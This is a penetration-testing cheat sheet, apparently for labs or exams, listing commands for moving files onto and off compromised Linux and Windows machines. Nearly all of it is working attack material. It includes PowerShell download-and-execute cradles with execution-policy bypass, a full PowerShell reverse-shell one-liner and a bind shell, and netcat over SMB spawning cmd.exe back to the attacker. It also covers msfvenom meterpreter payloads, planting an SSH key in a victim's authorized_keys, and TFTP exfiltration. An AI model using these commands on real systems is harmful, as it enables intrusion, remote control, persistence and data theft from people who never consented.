- [Linux](#Linux)
  - [wget](#wget)
  - [curl](#curl)
  - [nc](#nc)
  - [tftp](#tftp)
  - [axel](#axel)
  - [php](#php)
  - [scp](#scp)
  - [ssh](#ssh)
  
- [Windows](#windows)
  - [FTP](#FTP)
  - [TFTP](#TFTP)
  - [SMB](#SMB)
  - [Nishang](#Nishang)
  - [Netcat](Netcat)
  - [Meterpreter](Meterpreter)
  - [Impacket](Impacket)

## Linux 

### wget
```
wget [url/with/file] -p [local/path]
```
### curl
```
curl -O [url/with/file]
```
### nc
```
nc -lvp [port] > sending.file
```
### tftp

- service atftpd start

### axel
```
transfer file from a FTP or HTTP server through multiple connections.
axel -n 10 --output=axel-test100Mb.db http://speedtest.ftp.otenet.gr/files/test100Mb.db
```

```
Metasploit, has an auxiliary TFTP server module at auxiliary/server/tftp. Set the module options, including TFTPROOT, which determines which directory to serve up, and OUTPUTPATH if you want to capture TFTP uploads from Windows as well.
```
### php
echo "<?php file_put_contents('nameOfFile', fopen('http://[my_server_ip:port/fileName', 'r')); ?>" file_one_server.php

### scp 

### ssh

#### puts file to the attacking machine
ssh root@[ip] "cat > proof.txt < proof.txt"

#### Get files from the attacking machine
ssh root@[ip] "cat exploit" > "exploit

#### Python simple HTTPServer
***python -m SimpleHTTPServer [port]

##### curl
curl -O http://[my_server_ip:port]/fileName

##### wget
wget http://[my_server_ip:port]/fileName

##### tftp
tftp [my_server_ip]
tftp > get myFile
OR
tftp [my_server_ip] <<< "get file"

#### SSH-SCP
***ssh key generation flow***
- ssh-keygen -t rsa -C "your@email.com"
- add *.pub public key to auhorized_keys on victim server
- echo "ssh-rsa ASD3NbN[..]vlldor..." > authorized_keys
- log in ssh -i private_key [name]@[victim_machine_ip] -p [port]

#### SCP
***copy file***
scp /your/file/path.ext [name]@[victim_server_ip]:/your/file/destination/path.ext

***copy dir***
scrp -r /your/dir/path [name]@[victim_server_ip]:/your/dir/destination/path

#### Netcat
# TODO

## Windows 

### HTTP Download file with with PowerShell
#### (new-object System.Net.WebClient).DownloadFile('http://[ip]/file.exe','D:\User\name\Desktop\file.exe')

### FTP 
#### In linux machine install python-pyftpdlib
```
- apt-get install python-pyftpdlib
- python -m pyftdlib -p 21
If you want to grant the anonymous user write access, add the -w flag as well.

On windows
- ftp [linux_ip]
- binary
- get file.exe
```
### TFTP
#### In linux machine strtign the server 
- service atftpd start
```
Metasploit, has an auxiliary TFTP server module at auxiliary/server/tftp. Set the module options, including TFTPROOT, which determines which directory to serve up, and OUTPUTPATH if you want to capture TFTP uploads from Windows as well.
```
- On windows
- tftp -i [linux_ip] GET file.exe

Exfiltrating files via TFTP is simple as well with the PUT action. The Metasploit server saves them in /tmp by default
- tftp -i linux-ip PUT file.txt

### SMB
- In linux machine, download smbserver.py from impacket project https://github.com/SecureAuthCorp/impacket
```
python smbserver.py ROPNOP /root/shells
```
- In windows machine
```
- dir \\[linux_ip]\ROPNOP
- copy \\[linux_ip]\ROPNOP\file.exe
```

#### Nishang
- git clone [Nishang](https://github.com/samratashok/nishang)
- edit InvokePowerShellTcp.ps1 /nishang/Shells/
paste *Invoke-PowerShellTcp -Reverse -IPAddress [your_ip] -Port [your_port]* on bottom of the file.
- run python HTTP server
  -python -m SimpleHTTPServer 443
  -python3 -m http.server 443
-In the victim shell: 
  powershell iex(new-object net.webclient).downloadstring('http://[your_ip:port]/Invoke-PowerShellTcp.ps1')
  
#### Netcat
- smbserver.py  
git clone [impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)

- create directory (for example test)
cp nc.exe to test

- run smbserver
python smbserver.py test smb

- run local nc
nc -lnvp 443

-In the victim shell
\\[your_ip]\test\nc.exe -e cmd.exe [your_ip]

#### Meterpreter
- create msfvenom payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[you_ip] LPORT=[your_port] -f asp > rs.asp

- use mstfconsole
exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost, lport and run

- execute reverse shell
curl http://10.10.10.5/rs.asp

#### Impacket 
- https://github.com/SecureAuthCorp/impacket

### Windows

#### Nishang
- git clone [Nishang](https://github.com/samratashok/nishang)
- edit InvokePowerShellTcp.ps1 /nishang/Shells/
paste *Invoke-PowerShellTcp -Reverse -IPAddress [your_ip] -Port [your_port]* on bottom of the file.
- run python HTTP server
  -python -m SimpleHTTPServer 443
  -python3 -m http.server 443
-In the victim shell: 
  powershell iex(new-object System.net.webclient).downloadstring('http://[your_ip:port]/Invoke-PowerShellTcp.ps1')
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
#### Powershell
powershell -ExecutionPolicy Bypass -File wget.ps1 http://[your_ip:port]/file file

echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.1.101/file.exe" >>wget.ps1
echo $file = "output-file.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1

```
powershell iex(new-object System.net.webclient).downloadstring('http://[your_ip:port]/Invoke-PowerShellTcp.ps1')
```

##### PowerShell file download
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://[your_ip:port]/wget.exe','C:\Destination\path\wget.exe')"

powershell.exe -executionpolicy bypass -w hidden "iex(New-Object System.Net.WebClient).DownloadString('http://[your_ip]:8000/reverse.ps1'); reverse.ps1"
```

##### PowerShell Reverse Shell
```
$client = New-Object System.Net.Sockets.TCPClient('[your_ip]',[your_port]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

##### PowerShell Bind Shell
```
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener( '0.0.0.0',443);$listener.start();$client
= $listener.AcceptTcpClient();$stream = $clie nt.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
$stream.Read($bytes, 0, $byt es.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString
($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'P
S ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$str
eam.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Sto p()"
```

##### powershell wget http://[your_ip:port]
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
#### smbserver

- smbserver.py
```
git clone [impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)
```
create directory (for example test)
```
cp nc.exe to your_file_directory_path
```
run smbserver
```
python smbserver.py test your_file_directory_path (example: python smbserver.py test /root/mysmbfile
```
run local nc
```
nc -lnvp 443
```
In the victim shell
```
\\[your_ip]\test\nc.exe -e cmd.exe [your_ip]
```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
#### certutil
```
certutil -urlcache -f http://[your_ip]/file output_file_name
```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
#### Meterpreter
- create msfvenom payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[you_ip] LPORT=[your_port] -f asp > rs.asp

- use mstfconsole
exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost, lport and run

- execute reverse shell
curl http://10.10.10.5/rs.asp
